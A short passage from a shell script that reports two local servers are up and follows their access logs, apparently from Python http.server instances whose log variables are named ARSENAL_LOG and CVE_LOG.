_ok "Both servers up. Tailing access logs (Ctrl-C to stop)."
printf '\n'

# Merge tails. The python http.server logs to stderr — `tail -F` follows both.
tail -F -q "$ARSENAL_LOG" "$CVE_LOG" 2>/dev/null
